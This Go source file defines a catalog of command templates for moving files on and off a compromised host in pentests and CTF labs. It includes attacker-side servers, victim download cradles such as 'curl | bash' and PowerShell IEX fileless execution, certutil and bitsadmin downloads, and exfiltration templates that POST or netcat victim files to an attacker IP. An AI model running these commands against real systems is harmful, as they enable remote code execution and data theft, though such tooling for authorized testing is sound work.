package main

// fileTransferCatalog turns the "File Transfers" cheat sheets from the HTBNotes
// vault (04 - Exploitation / File Transfers) into a builder: the ways to move a
// file on or off a box once you have code execution. It covers standing up a
// quick HTTP/upload server on the attacker, pulling files down on a Linux or
// Windows victim (wget/curl, PowerShell download cradles, LOLBins like
// certutil/bitsadmin), pushing files back up, SMB/WebDAV, raw netcat, and
// base64 / openssl encoding for when you can only paste text.
//
// Values you fill in — URLs, file paths, ports, your attacker IP — are
// {PLACEHOLDER} tokens woven into each template in place (see Tool.Command /
// isPlaceholder). Standard techniques for authorized pentests, CTFs, and lab
// boxes; the engagement-scope guard applies when a command is Run.
var fileTransferCatalog = []Tool{

	// ── Attacker: serve files ────────────────────────────────────────────────
	{
		Name: "serve: python http", Binary: "python3 -m http.server {PORT}", Category: "serve",
		Desc:  "Serve the current directory over HTTP (the default attacker web server)",
		Flags: []Flag{ftPort("8000")},
	},
	{
		Name: "serve: python2 http", Binary: "python2.7 -m SimpleHTTPServer {PORT}", Category: "serve",
		Desc:  "Same, for boxes that only have Python 2",
		Flags: []Flag{ftPort("8000")},
	},
	{
		Name: "serve: php", Binary: "php -S 0.0.0.0:{PORT}", Category: "serve",
		Desc:  "Serve the current directory with PHP's built-in server",
		Flags: []Flag{ftPort("8000")},
	},
	{
		Name: "serve: ruby", Binary: "ruby -run -ehttpd . -p{PORT}", Category: "serve",
		Desc:  "Serve the current directory with Ruby's WEBrick one-liner",
		Flags: []Flag{ftPort("8000")},
	},
	{
		Name: "serve: uploadserver", Binary: "python3 -m uploadserver {PORT}", Category: "serve",
		Desc:  "HTTP server that also accepts POST uploads to /upload (pip install uploadserver)",
		Flags: []Flag{ftPort("8000")},
	},
	{
		Name:     "serve: uploadserver (https)",
		Binary:   "sudo python3 -m uploadserver {PORT} --server-certificate ~/server.pem",
		Category: "serve",
		Desc:     "Same, over TLS — generate server.pem with openssl req -x509 first",
		Flags:    []Flag{ftPort("443")},
	},
	{
		Name: "serve: impacket smbserver", Binary: "sudo impacket-smbserver share $(pwd) -smb2support",
		Category: "serve",
		Desc:     "Expose the current dir as an SMB share (add -user/-password if the client needs auth)",
		Flags:    []Flag{},
	},
	{
		Name:     "serve: webdav (wsgidav)",
		Binary:   "sudo wsgidav --host=0.0.0.0 --port={PORT} --root=/tmp --auth=anonymous",
		Category: "serve",
		Desc:     "Anonymous WebDAV share — reachable from Windows as \\\\<ip>\\DavWWWRoot",
		Flags:    []Flag{ftPort("80")},
	},
	{
		Name:     "serve: pyftpdlib",
		Binary:   "sudo python3 -m pyftpdlib --port {PORT} --write",
		Category: "serve",
		Desc:     "Writable anonymous FTP server to catch uploads from a Windows victim",
		Flags:    []Flag{ftPort("21")},
	},

	// ── Victim (Linux): download ─────────────────────────────────────────────
	{
		Name: "lin dl: wget", Binary: "wget {URL} -O {OUTFILE}", Category: "download: linux",
		Desc:  "Download a file to disk with wget",
		Flags: []Flag{ftURL(), ftOutfile()},
	},
	{
		Name: "lin dl: curl", Binary: "curl -o {OUTFILE} {URL}", Category: "download: linux",
		Desc:  "Download a file to disk with curl",
		Flags: []Flag{ftOutfile(), ftURL()},
	},
	{
		Name: "lin dl: curl | bash", Binary: "curl {URL} | bash", Category: "download: linux",
		Desc:  "Fetch a script and run it straight from memory (nothing touches disk)",
		Flags: []Flag{ftURL()},
	},
	{
		Name:     "lin dl: /dev/tcp",
		Binary:   "exec 3<>/dev/tcp/{LHOST}/{PORT}; echo -e 'GET /{FILE} HTTP/1.1\\n\\n'>&3; cat <&3",
		Category: "download: linux",
		Desc:     "Download over bash's /dev/tcp when no wget/curl exists (strip HTTP headers after)",
		Flags:    []Flag{ftLHOST(), ftPort("80"), ftFile()},
	},
	{
		Name: "lin dl: scp (pull)", Binary: "scp {USER}@{LHOST}:{REMOTE} .", Category: "download: linux",
		Desc:  "Pull a file over SSH from another host",
		Flags: []Flag{
			ftUser(), ftLHOST(),
			{Flag: "{REMOTE}", Name: "Remote path", Kind: KindString, Required: true,
				Placeholder: "/root/myroot.txt", Desc: "Path to the file on the remote host"},
		},
	},

	// ── Victim (Linux): upload ───────────────────────────────────────────────
	{
		Name:     "lin ul: curl POST",
		Binary:   "curl -X POST http://{LHOST}:{PORT}/upload -F 'files=@{FILE}' --insecure",
		Category: "upload: linux",
		Desc:     "Upload a file to a Python uploadserver via multipart POST",
		Flags:    []Flag{ftLHOST(), ftPort("8000"), ftFile()},
	},
	{
		Name: "lin ul: scp (push)", Binary: "scp {FILE} {USER}@{LHOST}:{DEST}", Category: "upload: linux",
		Desc:  "Push a local file to another host over SSH",
		Flags: []Flag{
			ftFile(), ftUser(), ftLHOST(),
			{Flag: "{DEST}", Name: "Destination path", Kind: KindString, Required: true,
				Placeholder: "/home/user/", Desc: "Where to drop the file on the remote host"},
		},
	},

	// ── Victim (Windows): download ───────────────────────────────────────────
	{
		Name:     "win dl: WebClient DownloadFile",
		Binary:   `(New-Object Net.WebClient).DownloadFile('{URL}','{OUTFILE}')`,
		Category: "download: windows",
		Desc:     "Classic PowerShell download-to-disk cradle",
		Flags:    []Flag{ftURL(), ftOutfile()},
	},
	{
		Name:     "win dl: IEX DownloadString",
		Binary:   `IEX (New-Object Net.WebClient).DownloadString('{URL}')`,
		Category: "download: windows",
		Desc:     "Fetch a script and execute it in memory (fileless)",
		Flags:    []Flag{ftURL()},
	},
	{
		Name:     "win dl: Invoke-WebRequest",
		Binary:   `Invoke-WebRequest {URL} -OutFile {OUTFILE}`,
		Category: "download: windows",
		Desc:     "Download to disk with IWR (slower; needs a profile on old boxes)",
		Flags:    []Flag{ftURL(), ftOutfile()},
	},
	{
		Name:     "win dl: IWR | IEX (no IE)",
		Binary:   `Invoke-WebRequest {URL} -UseBasicParsing | IEX`,
		Category: "download: windows",
		Desc:     "In-memory run with -UseBasicParsing — works before IE's first-run is configured",
		Flags:    []Flag{ftURL()},
	},
	{
		Name:     "win dl: certutil (LOLBin)",
		Binary:   `certutil.exe -urlcache -split -f {URL} {OUTFILE}`,
		Category: "download: windows",
		Desc:     "Download using the certutil living-off-the-land binary",
		Flags:    []Flag{ftURL(), ftOutfile()},
	},
	{
		Name:     "win dl: bitsadmin (LOLBin)",
		Binary:   `bitsadmin /transfer wcb /priority foreground {URL} {OUTFILE}`,
		Category: "download: windows",
		Desc:     "Download via the BITS service with bitsadmin",
		Flags:    []Flag{ftURL(), ftOutfile()},
	},
	{
		Name:     "win dl: Start-BitsTransfer",
		Binary:   `Import-Module bitstransfer; Start-BitsTransfer -Source "{URL}" -Destination "{OUTFILE}"`,
		Category: "download: windows",
		Desc:     "PowerShell BITS download (quieter than WebClient)",
		Flags:    []Flag{ftURL(), ftOutfile()},
	},

	// ── Victim (Windows): upload ─────────────────────────────────────────────
	{
		Name:     "win ul: base64 POST",
		Binary:   `$b64=[Convert]::ToBase64String((Get-Content -Path '{FILE}' -Encoding Byte)); Invoke-WebRequest -Uri http://{LHOST}:{PORT}/ -Method POST -Body $b64`,
		Category: "upload: windows",
		Desc:     "Base64 a file and POST it to a listener (catch with nc -lvnp, then base64 -d)",
		Flags: []Flag{
			{Flag: "{FILE}", Name: "File to exfil", Kind: KindString, Required: true,
				Placeholder: `C:\Windows\System32\drivers\etc\hosts`, Desc: "File to read and upload"},
			ftLHOST(), ftPort("8000"),
		},
	},
	{
		Name:     "win ul: WebClient UploadFile (ftp)",
		Binary:   `(New-Object Net.WebClient).UploadFile('ftp://{LHOST}/{OUTFILE}', '{FILE}')`,
		Category: "upload: windows",
		Desc:     "Upload to an anonymous FTP server (pair with the pyftpdlib server)",
		Flags: []Flag{
			ftLHOST(), ftOutfile(),
			{Flag: "{FILE}", Name: "File to exfil", Kind: KindString, Required: true,
				Placeholder: `C:\Windows\System32\drivers\etc\hosts`, Desc: "Local file on the victim to send"},
		},
	},
	{
		Name:     "win: WebDAV copy",
		Binary:   `copy {FILE} \\{LHOST}\DavWWWRoot\`,
		Category: "upload: windows",
		Desc:     "Copy a file to a mounted WebDAV share (pairs with the wsgidav server)",
		Flags: []Flag{
			{Flag: "{FILE}", Name: "File", Kind: KindString, Required: true,
				Placeholder: `C:\Users\john\Desktop\SourceCode.zip`, Desc: "File to copy"},
			ftLHOST(),
		},
	},

	// ── Raw netcat ───────────────────────────────────────────────────────────
	{
		Name: "nc: receive (listener)", Binary: "nc -l -p {PORT} > {OUTFILE}", Category: "netcat",
		Desc:  "Listen and write whatever arrives to a file (start this first)",
		Flags: []Flag{ftPort("8000"), ftOutfile()},
	},
	{
		Name: "nc: send", Binary: "nc -q 0 {LHOST} {PORT} < {FILE}", Category: "netcat",
		Desc:  "Send a file to a waiting nc listener and close when done",
		Flags: []Flag{ftLHOST(), ftPort("8000"), ftFile()},
	},
	{
		Name:     "nc: cat /dev/tcp receive",
		Binary:   "cat < /dev/tcp/{LHOST}/{PORT} > {OUTFILE}",
		Category: "netcat",
		Desc:     "Receive a file via bash /dev/tcp when nc isn't installed on the victim",
		Flags:    []Flag{ftLHOST(), ftPort("443"), ftOutfile()},
	},

	// ── Encoding / crypto ────────────────────────────────────────────────────
	{
		Name: "enc: base64 a file", Binary: "cat {FILE} | base64 -w 0; echo", Category: "encode",
		Desc:  "Base64-encode a file to one line you can copy-paste (e.g. an SSH key)",
		Flags: []Flag{ftFile()},
	},
	{
		Name: "enc: base64 decode (linux)", Binary: "echo -n {B64} | base64 -d > {OUTFILE}",
		Category: "encode",
		Desc:     "Decode a pasted base64 blob back into a file on Linux",
		Flags: []Flag{
			{Flag: "{B64}", Name: "Base64 blob", Kind: KindString, Required: true,
				Placeholder: "SGVsbG8=", Desc: "The base64 string to decode"},
			ftOutfile(),
		},
	},
	{
		Name:     "enc: base64 decode (windows)",
		Binary:   `[IO.File]::WriteAllBytes("{OUTFILE}", [Convert]::FromBase64String("{B64}"))`,
		Category: "encode",
		Desc:     "Decode a pasted base64 blob into a file in PowerShell",
		Flags: []Flag{
			{Flag: "{OUTFILE}", Name: "Output path", Kind: KindString, Required: true,
				Placeholder: `C:\Users\Public\id_rsa`, Desc: "Where to write the decoded file"},
			{Flag: "{B64}", Name: "Base64 blob", Kind: KindString, Required: true,
				Placeholder: "SGVsbG8=", Desc: "The base64 string to decode"},
		},
	},
	{
		Name:     "enc: openssl encrypt",
		Binary:   "openssl enc -aes256 -iter 100000 -pbkdf2 -in {FILE} -out {OUTFILE}",
		Category: "encode",
		Desc:     "Symmetrically encrypt a file before moving it over the wire",
		Flags:    []Flag{ftFile(), ftOutfile()},
	},
	{
		Name:     "enc: openssl decrypt",
		Binary:   "openssl enc -d -aes256 -iter 100000 -pbkdf2 -in {FILE} -out {OUTFILE}",
		Category: "encode",
		Desc:     "Decrypt a file produced by the openssl encrypt command above",
		Flags:    []Flag{ftFile(), ftOutfile()},
	},
}

// ── shared file-transfer flag helpers ────────────────────────────────────────

func ftURL() Flag {
	return Flag{Flag: "{URL}", Name: "URL", Kind: KindString, Required: true,
		Placeholder: "http://10.10.14.7:8000/file", Desc: "Full URL to fetch"}
}

func ftOutfile() Flag {
	return Flag{Flag: "{OUTFILE}", Name: "Output file", Kind: KindString, Required: true,
		Placeholder: "file", Desc: "Where to write the file"}
}

func ftFile() Flag {
	return Flag{Flag: "{FILE}", Name: "File", Kind: KindString, Required: true,
		Placeholder: "file", Desc: "Path to the file to send/read"}
}

func ftLHOST() Flag {
	return Flag{Flag: "{LHOST}", Name: "Attacker IP", Kind: KindString, Required: true,
		Placeholder: "10.10.14.7", Desc: "Your host (the file source/sink)"}
}

func ftUser() Flag {
	return Flag{Flag: "{USER}", Name: "Username", Kind: KindString, Required: true,
		Placeholder: "user", Desc: "SSH username"}
}

func ftPort(def string) Flag {
	return Flag{Flag: "{PORT}", Name: "Port", Kind: KindString, Required: true,
		Value: def, Placeholder: def, Desc: "TCP port"}
}
